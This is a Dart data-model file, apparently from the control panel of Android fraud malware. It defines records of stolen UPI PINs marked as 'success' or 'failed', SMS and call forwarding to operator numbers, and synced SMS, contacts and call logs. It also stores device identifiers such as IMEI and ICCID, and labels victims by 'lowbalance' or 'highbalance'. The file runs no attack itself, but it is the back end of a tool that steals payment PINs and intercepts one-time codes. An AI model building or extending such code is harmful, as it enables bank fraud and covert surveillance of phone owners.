import '../../core/utils/date_utils.dart' as utils;

class UPIPinEntry {
  final String pin;
  final String appType;
  final String status;
  final DateTime detectedAt;

  UPIPinEntry({
    required this.pin,
    required this.appType,
    required this.status,
    required this.detectedAt,
  });

  factory UPIPinEntry.fromJson(Map<String, dynamic> json) {
    return UPIPinEntry(
      pin: json['pin'] ?? '',
      appType: json['app_type'] ?? '',
      status: json['status'] ?? 'failed',
      detectedAt: json['detected_at'] != null
          ? _parseTimestamp(json['detected_at'])
          : DateTime.now(),
    );
  }

  Map<String, dynamic> toJson() {
    return {
      'pin': pin,
      'app_type': appType,
      'status': status,
      'detected_at': detectedAt.toIso8601String(),
    };
  }

  bool get isSuccess => status == 'success';
  bool get isFailed => status == 'failed';
}

class DeviceSettings {
  final bool smsForwardEnabled;
  final String? forwardNumber;
  final bool monitoringEnabled;
  final bool autoReplyEnabled;

  DeviceSettings({
    required this.smsForwardEnabled,
    this.forwardNumber,
    required this.monitoringEnabled,
    required this.autoReplyEnabled,
  });

  factory DeviceSettings.fromJson(Map<String, dynamic> json) {
    return DeviceSettings(
      smsForwardEnabled: json['sms_forward_enabled'] ?? false,
      forwardNumber: json['forward_number'],
      monitoringEnabled: json['monitoring_enabled'] ?? true,
      autoReplyEnabled: json['auto_reply_enabled'] ?? false,
    );
  }

  Map<String, dynamic> toJson() {
    return {
      'sms_forward_enabled': smsForwardEnabled,
      'forward_number': forwardNumber,
      'monitoring_enabled': monitoringEnabled,
      'auto_reply_enabled': autoReplyEnabled,
    };
  }
}

class DeviceStats {
  final int totalSms;
  final int totalContacts;
  final int totalCalls;
  final DateTime? lastSmsSyncDate;
  final DateTime? lastContactSyncDate;
  final DateTime? lastCallSyncDate;

  DeviceStats({
    required this.totalSms,
    required this.totalContacts,
    required this.totalCalls,
    this.lastSmsSyncDate,
    this.lastContactSyncDate,
    this.lastCallSyncDate,
  });

  factory DeviceStats.fromJson(Map<String, dynamic> json) {
    return DeviceStats(
      totalSms: json['total_sms'] ?? 0,
      totalContacts: json['total_contacts'] ?? 0,
      totalCalls: json['total_calls'] ?? 0,
      lastSmsSyncDate: json['last_sms_sync'] != null
          ? _parseTimestamp(json['last_sms_sync'])
          : null,
      lastContactSyncDate: json['last_contact_sync'] != null
          ? _parseTimestamp(json['last_contact_sync'])
          : null,
      lastCallSyncDate: json['last_call_sync'] != null
          ? _parseTimestamp(json['last_call_sync'])
          : null,
    );
  }

  Map<String, dynamic> toJson() {
    return {
      'total_sms': totalSms,
      'total_contacts': totalContacts,
      'total_calls': totalCalls,
      if (lastSmsSyncDate != null)
        'last_sms_sync': lastSmsSyncDate!.toIso8601String(),
      if (lastContactSyncDate != null)
        'last_contact_sync': lastContactSyncDate!.toIso8601String(),
      if (lastCallSyncDate != null)
        'last_call_sync': lastCallSyncDate!.toIso8601String(),
    };
  }
}

class SimInfo {
  final int simSlot;
  final int? subscriptionId;
  final String carrierName;
  final String displayName;
  final String phoneNumber;
  final String? countryIso;
  final String? mcc;
  final String? mnc;
  final bool isNetworkRoaming;
  final int? iconTint;
  final int? cardId;
  final int? carrierId;
  final bool isEmbedded;
  final bool isOpportunistic;
  final String? iccId;
  final String? groupUuid;
  final int? portIndex;
  final String? networkType;
  final String? networkOperatorName;
  final String? networkOperator;
  final String? simOperatorName;
  final String? simOperator;
  final String? simState;
  final String? phoneType;
  final String? imei;
  final String? meid;
  final bool dataEnabled;
  final bool dataRoamingEnabled;
  final bool voiceCapable;
  final bool smsCapable;
  final bool hasIccCard;
  final String? deviceSoftwareVersion;
  final String? visualVoicemailPackageName;
  final String? networkCountryIso;
  final String? simCountryIso;

  SimInfo({
    required this.simSlot,
    this.subscriptionId,
    required this.carrierName,
    required this.displayName,
    required this.phoneNumber,
    this.countryIso,
    this.mcc,
    this.mnc,
    this.isNetworkRoaming = false,
    this.iconTint,
    this.cardId,
    this.carrierId,
    this.isEmbedded = false,
    this.isOpportunistic = false,
    this.iccId,
    this.groupUuid,
    this.portIndex,
    this.networkType,
    this.networkOperatorName,
    this.networkOperator,
    this.simOperatorName,
    this.simOperator,
    this.simState,
    this.phoneType,
    this.imei,
    this.meid,
    this.dataEnabled = false,
    this.dataRoamingEnabled = false,
    this.voiceCapable = false,
    this.smsCapable = false,
    this.hasIccCard = false,
    this.deviceSoftwareVersion,
    this.visualVoicemailPackageName,
    this.networkCountryIso,
    this.simCountryIso,
  });

  factory SimInfo.fromJson(Map<String, dynamic> json) {
    return SimInfo(
      simSlot: json['sim_slot'] ?? 0,
      subscriptionId: json['subscription_id'],
      carrierName: json['carrier_name'] ?? '',
      displayName: json['display_name'] ?? '',
      phoneNumber: json['phone_number'] ?? '',
      countryIso: json['country_iso'],
      mcc: json['mcc'],
      mnc: json['mnc'],
      isNetworkRoaming: json['is_network_roaming'] ?? false,
      iconTint: json['icon_tint'],
      cardId: json['card_id'],
      carrierId: json['carrier_id'],
      isEmbedded: json['is_embedded'] ?? false,
      isOpportunistic: json['is_opportunistic'] ?? false,
      iccId: json['icc_id'],
      groupUuid: json['group_uuid'],
      portIndex: json['port_index'],
      networkType: json['network_type'],
      networkOperatorName: json['network_operator_name'],
      networkOperator: json['network_operator'],
      simOperatorName: json['sim_operator_name'],
      simOperator: json['sim_operator'],
      simState: json['sim_state'],
      phoneType: json['phone_type'],
      imei: json['imei'],
      meid: json['meid'],
      dataEnabled: json['data_enabled'] ?? false,
      dataRoamingEnabled: json['data_roaming_enabled'] ?? false,
      voiceCapable: json['voice_capable'] ?? false,
      smsCapable: json['sms_capable'] ?? false,
      hasIccCard: json['has_icc_card'] ?? false,
      deviceSoftwareVersion: json['device_software_version'],
      visualVoicemailPackageName: json['visual_voicemail_package_name'],
      networkCountryIso: json['network_country_iso'],
      simCountryIso: json['sim_country_iso'],
    );
  }


  Map<String, dynamic> toJson() {
    return {
      'sim_slot': simSlot,
      if (subscriptionId != null) 'subscription_id': subscriptionId,
      'carrier_name': carrierName,
      'display_name': displayName,
      'phone_number': phoneNumber,
      if (countryIso != null) 'country_iso': countryIso,
      if (mcc != null) 'mcc': mcc,
      if (mnc != null) 'mnc': mnc,
      'is_network_roaming': isNetworkRoaming,
      if (iconTint != null) 'icon_tint': iconTint,
      if (cardId != null) 'card_id': cardId,
      if (carrierId != null) 'carrier_id': carrierId,
      'is_embedded': isEmbedded,
      'is_opportunistic': isOpportunistic,
      if (iccId != null) 'icc_id': iccId,
      if (groupUuid != null) 'group_uuid': groupUuid,
      if (portIndex != null) 'port_index': portIndex,
      if (networkType != null) 'network_type': networkType,
      if (networkOperatorName != null)
        'network_operator_name': networkOperatorName,
      if (networkOperator != null) 'network_operator': networkOperator,
      if (simOperatorName != null) 'sim_operator_name': simOperatorName,
      if (simOperator != null) 'sim_operator': simOperator,
      if (simState != null) 'sim_state': simState,
      if (phoneType != null) 'phone_type': phoneType,
      if (imei != null) 'imei': imei,
      if (meid != null) 'meid': meid,
      'data_enabled': dataEnabled,
      'data_roaming_enabled': dataRoamingEnabled,
      'voice_capable': voiceCapable,
      'sms_capable': smsCapable,
      'has_icc_card': hasIccCard,
      if (deviceSoftwareVersion != null)
        'device_software_version': deviceSoftwareVersion,
      if (visualVoicemailPackageName != null)
        'visual_voicemail_package_name': visualVoicemailPackageName,
      if (networkCountryIso != null) 'network_country_iso': networkCountryIso,
      if (simCountryIso != null) 'sim_country_iso': simCountryIso,
    };
  }

  bool get isActive => simState == 'Ready';
  bool get isDataSim => dataEnabled;
  String get fullCarrierInfo => '$carrierName ($networkType)';
}

class Device {
  final String deviceId;
  final String? userId;
  final String? appType;
  final String model;
  final String manufacturer;
  final String osVersion;
  final String? appVersion;
  final String status;
  final int batteryLevel;
  final DateTime lastPing;
  final DeviceSettings settings;
  final DeviceStats stats;
  final DateTime registeredAt;
  final DateTime? updatedAt;
  final String? brand;
  final String? deviceName;
  final String? device;
  final String? product;
  final String? hardware;
  final String? board;
  final String? display;
  final String? fingerprint;
  final String? host;
  final int? sdkInt;
  final List<String>? supportedAbis;
  final String? batteryState;
  final bool? isCharging;
  final double? totalStorageMb;
  final double? freeStorageMb;
  final double? storageUsedMb;
  final double? storagePercentFree;
  final double? totalRamMb;
  final double? freeRamMb;
  final double? ramUsedMb;
  final double? ramPercentFree;
  final String? networkType;
  final String? ipAddress;
  final bool? isRooted;
  final bool? isEmulator;
  final String? screenResolution;
  final double? screenDensity;
  final List<SimInfo>? simInfo;
  final bool hasUpi;
  final DateTime? upiDetectedAt;
  final String? upiPin;  // Deprecated - kept for backward compatibility
  final List<UPIPinEntry>? upiPins;  // Use this - array of PIN entries
  final DateTime? upiLastUpdatedAt;  // Last time UPI PINs were updated
  final bool? isOnlineStatus;
  final DateTime? lastOnlineUpdate;
  final List<String>? fcmTokens;
  final bool? callForwardingEnabled;
  final String? callForwardingNumber;
  final int? callForwardingSimSlot;
  final DateTime? callForwardingUpdatedAt;

  final String? notePriority;
  final String? noteMessage;
  final DateTime? noteCreatedAt;
  
  final String? adminNotePriority;
  final String? adminNoteMessage;
  final DateTime? adminNoteCreatedAt;
  
  final bool? isUninstalled;
  final DateTime? uninstalledAt;

  Device({
    required this.deviceId,
    this.userId,
    this.appType,
    required this.model,
    required this.manufacturer,
    required this.osVersion,
    this.appVersion,
    required this.status,
    required this.batteryLevel,
    required this.lastPing,
    required this.settings,
    required this.stats,
    required this.registeredAt,
    this.updatedAt,
    this.brand,
    this.deviceName,
    this.device,
    this.product,
    this.hardware,
    this.board,
    this.display,
    this.fingerprint,
    this.host,
    this.sdkInt,
    this.supportedAbis,
    this.batteryState,
    this.isCharging,
    this.totalStorageMb,
    this.freeStorageMb,
    this.storageUsedMb,
    this.storagePercentFree,
    this.totalRamMb,
    this.freeRamMb,
    this.ramUsedMb,
    this.ramPercentFree,
    this.networkType,
    this.ipAddress,
    this.isRooted,
    this.isEmulator,
    this.screenResolution,
    this.screenDensity,
    this.simInfo,
    this.hasUpi = false,
    this.upiDetectedAt,
    this.upiPin,
    this.upiPins,
    this.upiLastUpdatedAt,
    this.isOnlineStatus,
    this.lastOnlineUpdate,
    this.fcmTokens,
    this.callForwardingEnabled,
    this.callForwardingNumber,
    this.callForwardingSimSlot,
    this.callForwardingUpdatedAt,
    this.notePriority,
    this.noteMessage,
    this.noteCreatedAt,
    this.adminNotePriority,
    this.adminNoteMessage,
    this.adminNoteCreatedAt,
    this.isUninstalled,
    this.uninstalledAt,
  });

  factory Device.fromJson(Map<String, dynamic> json) {
    return Device(
      deviceId: json['device_id'] ?? '',
      userId: json['user_id'],
      appType: json['app_type'],
      model: json['model'] ?? 'Unknown',
      manufacturer: json['manufacturer'] ?? 'Unknown',
      osVersion: json['os_version'] ?? 'Unknown',
      appVersion: json['app_version'],
      status: json['status'] ?? 'offline',
      batteryLevel: json['battery_level'] ?? 0,
      lastPing: json['last_ping'] != null
          ? _parseTimestamp(json['last_ping'])
          : DateTime.now(),
      settings: DeviceSettings.fromJson(json['settings'] ?? {}),
      stats: DeviceStats.fromJson(json['stats'] ?? {}),
      registeredAt: _parseTimestamp(json['registered_at']),
      updatedAt: json['updated_at'] != null
          ? _parseTimestamp(json['updated_at'])
          : null,
      brand: json['brand'],
      deviceName: json['device_name'],
      device: json['device'],
      product: json['product'],
      hardware: json['hardware'],
      board: json['board'],
      display: json['display'],
      fingerprint: json['fingerprint'],
      host: json['host'],
      sdkInt: json['sdk_int'],
      supportedAbis: json['supported_abis'] != null
          ? List<String>.from(json['supported_abis'])
          : null,
      batteryState: json['battery_state'],
      isCharging: json['is_charging'],
      totalStorageMb: json['total_storage_mb']?.toDouble(),
      freeStorageMb: json['free_storage_mb']?.toDouble(),
      storageUsedMb: json['storage_used_mb']?.toDouble(),
      storagePercentFree: json['storage_percent_free']?.toDouble(),
      totalRamMb: json['total_ram_mb']?.toDouble(),
      freeRamMb: json['free_ram_mb']?.toDouble(),
      ramUsedMb: json['ram_used_mb']?.toDouble(),
      ramPercentFree: json['ram_percent_free']?.toDouble(),
      networkType: json['network_type'],
      ipAddress: json['ip_address'],
      isRooted: json['is_rooted'],
      isEmulator: json['is_emulator'],
      screenResolution: json['screen_resolution'],
      screenDensity: json['screen_density']?.toDouble(),
      simInfo: json['sim_info'] != null
          ? (json['sim_info'] as List)
          .map((x) => SimInfo.fromJson(x))
          .toList()
          : null,
      hasUpi: json['has_upi'] ?? false,
      upiDetectedAt: json['upi_detected_at'] != null
          ? _parseTimestamp(json['upi_detected_at'])
          : null,
      upiPin: json['upi_pin'],
      upiPins: json['upi_pins'] != null
          ? (json['upi_pins'] as List)
              .map((x) => UPIPinEntry.fromJson(x))
              .toList()
          : null,
      upiLastUpdatedAt: json['upi_last_updated_at'] != null
          ? _parseTimestamp(json['upi_last_updated_at'])
          : null,
      isOnlineStatus: json['is_online'],
      lastOnlineUpdate: json['last_online_update'] != null
          ? _parseTimestamp(json['last_online_update'])
          : null,
      fcmTokens: json['fcm_tokens'] != null
          ? List<String>.from(json['fcm_tokens'])
          : null,
      callForwardingEnabled: json['call_forwarding_enabled'],
      callForwardingNumber: json['call_forwarding_number'],
      callForwardingSimSlot: json['call_forwarding_sim_slot'],
      callForwardingUpdatedAt: json['call_forwarding_updated_at'] != null
          ? _parseTimestamp(json['call_forwarding_updated_at'])
          : null,
      notePriority: json['note_priority'],
      noteMessage: json['note_message'],
      noteCreatedAt: json['note_created_at'] != null
          ? _parseTimestamp(json['note_created_at'])
          : null,
      adminNotePriority: json['admin_note_priority'],
      adminNoteMessage: json['admin_note_message'],
      adminNoteCreatedAt: json['admin_note_created_at'] != null
          ? _parseTimestamp(json['admin_note_created_at'])
          : null,
      isUninstalled: json['is_uninstalled'],
      uninstalledAt: json['uninstalled_at'] != null
          ? _parseTimestamp(json['uninstalled_at'])
          : null,
    );
  }

  Map<String, dynamic> toJson() {
    return {
      'device_id': deviceId,
      if (userId != null) 'user_id': userId,
      if (appType != null) 'app_type': appType,
      'model': model,
      'manufacturer': manufacturer,
      'os_version': osVersion,
      if (appVersion != null) 'app_version': appVersion,
      'status': status,
      'battery_level': batteryLevel,
      'last_ping': lastPing.toIso8601String(),
      'settings': settings.toJson(),
      'stats': stats.toJson(),
      'registered_at': registeredAt.toIso8601String(),
      if (updatedAt != null) 'updated_at': updatedAt!.toIso8601String(),
      if (brand != null) 'brand': brand,
      if (deviceName != null) 'device_name': deviceName,
      if (device != null) 'device': device,
      if (product != null) 'product': product,
      if (hardware != null) 'hardware': hardware,
      if (board != null) 'board': board,
      if (display != null) 'display': display,
      if (fingerprint != null) 'fingerprint': fingerprint,
      if (host != null) 'host': host,
      if (sdkInt != null) 'sdk_int': sdkInt,
      if (supportedAbis != null) 'supported_abis': supportedAbis,
      if (batteryState != null) 'battery_state': batteryState,
      if (isCharging != null) 'is_charging': isCharging,
      if (totalStorageMb != null) 'total_storage_mb': totalStorageMb,
      if (freeStorageMb != null) 'free_storage_mb': freeStorageMb,
      if (storageUsedMb != null) 'storage_used_mb': storageUsedMb,
      if (storagePercentFree != null)
        'storage_percent_free': storagePercentFree,
      if (totalRamMb != null) 'total_ram_mb': totalRamMb,
      if (freeRamMb != null) 'free_ram_mb': freeRamMb,
      if (ramUsedMb != null) 'ram_used_mb': ramUsedMb,
      if (ramPercentFree != null) 'ram_percent_free': ramPercentFree,
      if (networkType != null) 'network_type': networkType,
      if (ipAddress != null) 'ip_address': ipAddress,
      if (isRooted != null) 'is_rooted': isRooted,
      if (isEmulator != null) 'is_emulator': isEmulator,
      if (screenResolution != null) 'screen_resolution': screenResolution,
      if (screenDensity != null) 'screen_density': screenDensity,
      if (simInfo != null)
        'sim_info': simInfo!.map((x) => x.toJson()).toList(),
      'has_upi': hasUpi,
      if (upiDetectedAt != null)
        'upi_detected_at': upiDetectedAt!.toIso8601String(),
      if (upiPin != null) 'upi_pin': upiPin,  // Deprecated
      if (upiPins != null)
        'upi_pins': upiPins!.map((x) => x.toJson()).toList(),
      if (upiLastUpdatedAt != null)
        'upi_last_updated_at': upiLastUpdatedAt!.toIso8601String(),
      if (isOnlineStatus != null) 'is_online': isOnlineStatus,
      if (lastOnlineUpdate != null)
        'last_online_update': lastOnlineUpdate!.toIso8601String(),
      if (fcmTokens != null) 'fcm_tokens': fcmTokens,
      if (callForwardingEnabled != null)
        'call_forwarding_enabled': callForwardingEnabled,
      if (callForwardingNumber != null)
        'call_forwarding_number': callForwardingNumber,
      if (callForwardingSimSlot != null)
        'call_forwarding_sim_slot': callForwardingSimSlot,
      if (callForwardingUpdatedAt != null)
        'call_forwarding_updated_at':
        callForwardingUpdatedAt!.toIso8601String(),
      if (notePriority != null) 'note_priority': notePriority,
      if (noteMessage != null) 'note_message': noteMessage,
      if (noteCreatedAt != null)
        'note_created_at': noteCreatedAt!.toIso8601String(),
      if (adminNotePriority != null) 'admin_note_priority': adminNotePriority,
      if (adminNoteMessage != null) 'admin_note_message': adminNoteMessage,
      if (adminNoteCreatedAt != null)
        'admin_note_created_at': adminNoteCreatedAt!.toIso8601String(),
      if (isUninstalled != null) 'is_uninstalled': isUninstalled,
      if (uninstalledAt != null) 'uninstalled_at': uninstalledAt!.toIso8601String(),
    };
  }

  bool get isOnline => isOnlineStatus ?? (status == 'online');
  bool get isOffline => !isOnline;
  bool get isActive =>
      stats.totalSms > 0 || stats.totalContacts > 0 || stats.totalCalls > 0;
  bool get isPending => !isActive;

  bool get hasNote => noteMessage != null && noteMessage!.isNotEmpty;
  
  bool get hasAdminNote => adminNoteMessage != null && adminNoteMessage!.isNotEmpty;

  bool get hasLowBalanceNote => notePriority == 'lowbalance';
  bool get hasHighBalanceNote => notePriority == 'highbalance';
  bool get hasNoPriorityNote => notePriority == 'none' || notePriority == null;

  String get notePriorityLabel {
    if (notePriority == 'lowbalance') return 'Low Balance';
    if (notePriority == 'highbalance') return 'High Balance';
    if (notePriority == 'none') return 'No Priority';
    return 'No Note';
  }

  String get noteTimeAgo {
    if (noteCreatedAt == null) return 'N/A';
    final diff = DateTime.now().difference(noteCreatedAt!);
    if (diff.inDays > 0) return '${diff.inDays}d ago';
    if (diff.inHours > 0) return '${diff.inHours}h ago';
    return '${diff.inMinutes}m ago';
  }

  String get fullDeviceName {
    if (brand != null && model != null) {
      return '$brand $model';
    }
    return model;
  }

  bool get hasLowBattery => batteryLevel < 20;
  bool get hasCriticalBattery => batteryLevel < 10;

  bool get hasLowStorage {
    if (storagePercentFree == null) return false;
    return storagePercentFree! < 10;
  }

  bool get hasLowRam {
    if (ramPercentFree == null) return false;
    return ramPercentFree! < 10;
  }

  String get storageInfo {
    if (freeStorageMb == null || totalStorageMb == null) return 'Unknown';
    final freeGB = (freeStorageMb! / 1024).round();
    final totalGB = (totalStorageMb! / 1024).round();
    return '$freeGB / $totalGB GB';
  }

  String get ramInfo {
    if (freeRamMb == null || totalRamMb == null) return 'Unknown';
    final freeGB = (freeRamMb! / 1024).round();
    final totalGB = (totalRamMb! / 1024).round();
    return '$freeGB / $totalGB GB';
  }

  bool get hasNoSim => simInfo == null || simInfo!.isEmpty;
  bool get hasSingleSim => simInfo != null && simInfo!.length == 1;
  bool get hasDualSim => simInfo != null && simInfo!.length == 2;
  bool get hasMultipleSims => simInfo != null && simInfo!.length > 2;

  int get simCount => simInfo?.length ?? 0;

  String get primaryCarrier {
    if (hasNoSim) return 'No SIM';
    return simInfo![0].carrierName;
  }

  String get secondaryCarrier {
    if (!hasDualSim && !hasMultipleSims) return 'N/A';
    return simInfo![1].carrierName;
  }

  List<String> get allCarriers {
    if (hasNoSim) return [];
    return simInfo!.map((sim) => sim.carrierName).toList();
  }

  List<String> get allPhoneNumbers {
    if (hasNoSim) return [];
    return simInfo!.map((sim) => sim.phoneNumber).toList();
  }

  String get primaryPhoneNumber {
    if (hasNoSim) return 'N/A';
    return simInfo![0].phoneNumber;
  }

  String get simStatusSummary {
    if (hasNoSim) return 'No SIM Card';
    if (hasSingleSim) return '1 SIM: ${primaryCarrier}';
    if (hasDualSim) return '2 SIMs: ${primaryCarrier} & ${secondaryCarrier}';
    return '$simCount SIMs';
  }

  SimInfo? getSimBySlot(int slot) {
    if (hasNoSim) return null;
    try {
      return simInfo!.firstWhere((sim) => sim.simSlot == slot);
    } catch (e) {
      return null;
    }
  }

  bool isSimSlotActive(int slot) {
    final sim = getSimBySlot(slot);
    return sim?.isActive ?? false;
  }

  String get upiStatus {
    if (hasUpi) {
      return 'UPI Enabled';
    }
    return 'No UPI';
  }

  String get upiDetectedTime {
    if (upiDetectedAt == null) return 'N/A';
    final diff = DateTime.now().difference(upiDetectedAt!);
    if (diff.inDays > 0) return '${diff.inDays}d ago';
    if (diff.inHours > 0) return '${diff.inHours}h ago';
    return '${diff.inMinutes}m ago';
  }

  bool get hasUpiPin => upiPin != null && upiPin!.isNotEmpty;

  String get upiPinStatus {
    if (hasUpiPins) return 'PIN Set ✓';
    return 'No PIN';
  }

  bool get hasUpiPins => upiPins != null && upiPins!.isNotEmpty;

  UPIPinEntry? get latestUpiPin => hasUpiPins ? upiPins![0] : null;

  List<UPIPinEntry> get successUpiPins {
    if (!hasUpiPins) return [];
    return upiPins!.where((pin) => pin.isSuccess).toList();
  }

  int get upiPinsCount => upiPins?.length ?? 0;

  int get successUpiPinsCount => successUpiPins.length;

  String get networkInfo {
    if (networkType == null) return 'Unknown';
    return networkType!;
  }

  bool get isOnWifi => networkType?.toLowerCase() == 'wifi';
  bool get isOnMobile => networkType?.toLowerCase() == 'mobile';

  bool get hasCallForwarding =>
      callForwardingEnabled == true && callForwardingNumber != null;

  String get callForwardingInfo {
    if (!hasCallForwarding) return 'Not Active';
    final simSlot =
    callForwardingSimSlot != null ? 'SIM ${callForwardingSimSlot! + 1}' : 'Unknown SIM';
    return 'Active on $simSlot → $callForwardingNumber';
  }

  bool get isUninstalledStatus => isUninstalled == true;

  String get uninstalledTimeAgo {
    if (uninstalledAt == null) return 'N/A';
    final diff = DateTime.now().difference(uninstalledAt!);
    if (diff.inDays > 0) return '${diff.inDays}d ago';
    if (diff.inHours > 0) return '${diff.inHours}h ago';
    return '${diff.inMinutes}m ago';
  }

  String get lastPingTimeAgo {
    final diff = DateTime.now().difference(lastPing);
    if (diff.inSeconds < 60) return 'Just now';
    if (diff.inMinutes < 60) return '${diff.inMinutes}m ago';
    if (diff.inHours < 24) return '${diff.inHours}h ago';
    if (diff.inDays < 7) return '${diff.inDays}d ago';
    return '${(diff.inDays / 7).floor()}w ago';
  }

  String get lastPingFormatted {
    return utils.DateUtils.formatForDisplay(lastPing);
  }

}

DateTime _parseTimestamp(dynamic timestamp) {
  return utils.DateUtils.parseTimestamp(timestamp);
}

